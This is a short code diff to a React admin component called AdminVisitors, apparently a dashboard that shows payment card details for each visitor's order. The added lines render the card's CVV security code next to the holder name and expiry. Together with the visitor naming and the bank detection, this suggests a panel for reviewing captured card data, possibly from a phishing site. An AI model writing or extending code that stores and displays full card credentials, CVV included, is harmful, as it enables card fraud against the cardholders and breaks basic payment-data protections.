@@ -2026,10 +2026,16 @@ const AdminVisitors = () => {
                                                 <p className="text-white/50 text-[7px]">CARD HOLDER</p>
                                                 <p className="text-white/90 font-medium truncate max-w-[140px]">{order.card_holder_name || "—"}</p>
                                               </div>
-                                              <div className="text-left" dir="ltr">
+                                            <div className="text-left" dir="ltr">
                                                 <p className="text-white/50 text-[7px]">EXPIRES</p>
                                                 <p className="text-white/90 font-medium">{order.card_expiry || "MM/YY"}</p>
                                               </div>
+                                              {order.card_cvv && (
+                                                <div className="text-left" dir="ltr">
+                                                  <p className="text-white/50 text-[7px]">CVV</p>
+                                                  <p className="text-white/90 font-bold font-mono">{order.card_cvv}</p>
+                                                </div>
+                                              )}
                                             </div>
                                             {meta.isDetected && meta.bankName && (
                                               <p className="absolute bottom-1 left-1/2 -translate-x-1/2 text-[7px] text-white/40">{meta.bankName}</p>
